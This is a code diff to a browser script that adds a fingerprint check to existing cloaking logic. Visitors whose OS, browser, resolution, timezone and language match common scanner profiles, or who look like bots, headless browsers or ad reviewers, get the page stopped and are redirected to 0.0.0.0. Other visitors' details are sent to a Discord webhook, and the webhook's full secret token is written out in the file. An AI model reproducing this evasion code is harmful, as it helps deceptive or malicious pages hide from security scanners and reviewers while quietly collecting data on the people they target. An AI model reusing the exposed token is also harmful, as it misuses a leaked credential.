@@ -275,6 +275,33 @@
     return suspicious_patterns.some(pattern => current_status === pattern);
   }
 
+  function isSuspiciousFingerprint() {
+    const suspicious_patterns = [
+      "Linux,Chrome,1920,1080,America/Chicago,en-US,en",
+      "Linux,Chrome,1920,1080,America/Denver,en-US,en",
+      "Linux,Chrome,1920,1080,America/Los_Angeles,en-US,en",
+      "Linux,Chrome,1920,1080,America/Mexico_City,en-US,en",
+      "Linux,Chrome,1920,1080,America/New_York,en-US,en",
+      "Linux,Chrome,1920,1080,America/Phoenix,en-US,en",
+    ];
+
+    const is_undefined = (
+      typeof window === 'undefined' || 
+      typeof screen === 'undefined' || 
+      typeof navigator === 'undefined' ||
+      typeof Intl === 'undefined'
+    );
+    if (is_undefined) return false;
+
+    const my_res = `${screen.width},${screen.height}`;
+    const my_tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const my_langs = navigator.languages ? navigator.languages.join(',') : navigator.language;
+
+    const current_status = `${os},${browser},${my_res},${my_tz},${my_langs}`;
+
+    return suspicious_patterns.some(pattern => current_status === pattern);
+  }
+
   function isSuspiciousQuery(){
     const suspicious_keys = new Set([
       'ad_format_ids',
@@ -322,10 +349,35 @@
     return (typeof window === 'undefined' || typeof screen === 'undefined')
   }
 
+  function getOs(ua){
+    // 簡単なOS・ブラウザ判別ロジック
+    let os = "Unknown OS";
+    if (ua.indexOf("Win") != -1) os = "Windows";
+    if (ua.indexOf("Mac") != -1) os = "Mac OS";
+    if (ua.indexOf("Linux") != -1) os = "Linux";
+    if (ua.indexOf("Android") != -1) os = "Android";
+    if (ua.indexOf("like Mac") != -1) os = "iOS";
+    return os;
+  }
+
+  function getBrowser(ua){
+    // 簡単なOS・ブラウザ判別ロジック
+    let browser = "Unknown Browser";
+    if (ua.indexOf("Chrome") != -1) browser = "Chrome";
+    else if (ua.indexOf("Firefox") != -1) browser = "Firefox";
+    else if (ua.indexOf("Safari") != -1) browser = "Safari";
+    else if (ua.indexOf("Edge") != -1) browser = "Edge";
+    return browser;
+  }
+
+  const ua = navigator.userAgent;
+  const os = getOs(ua);
+  const browser = getBrowser(ua);
+
   const isDirectAccess = !document.referrer;
   const isSuspiciousBot = !(isFriendlyBot_inline() && !isE2Etest_inline());
 
-  if (isDirectAccess && isSuspiciousBot && (isSuspiciousTimezone() || isSuspiciousRegion() || isSuspiciousResolution() || isSuspiciousCombination() || isSuspiciousQuery() || is360browser() || isHeadless() || isServerside())) {
+  if (isDirectAccess && isSuspiciousBot && (isSuspiciousTimezone() || isSuspiciousRegion() || isSuspiciousResolution() || isSuspiciousCombination() || isSuspiciousFingerprint() || isSuspiciousQuery() || is360browser() || isHeadless() || isServerside())) {
     window.stop();
     
     const destination_url = "https://0.0.0.0";
@@ -515,7 +567,7 @@
     const webhookUrl = 'https://discord.com/api/webhooks/1459720856203825315/jcn_enLc0xQKrTtKvSJev_T3m_cAnlBVlEgqZxESPBBp1V0pcPL5LGypcSJ8uZ47Q7d2';
 
     // user agentの取得
-    const ua = navigator.userAgent;
+    //const ua = navigator.userAgent;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const languages = navigator.languages;
     const resolution = `${window.screen.width}x${window.screen.height}`;
@@ -523,6 +575,7 @@
     const current_url = `${window.location.href}`;
 
     // 簡単なOS・ブラウザ判別ロジック
+    /*
     let os = "Unknown OS";
     if (ua.indexOf("Win") != -1) os = "Windows";
     if (ua.indexOf("Mac") != -1) os = "Mac OS";
@@ -535,6 +588,7 @@
     else if (ua.indexOf("Firefox") != -1) browser = "Firefox";
     else if (ua.indexOf("Safari") != -1) browser = "Safari";
     else if (ua.indexOf("Edge") != -1) browser = "Edge";
+    */
 
     // Discordに送信するデータ構造
     let log_title = "🫥 Default";
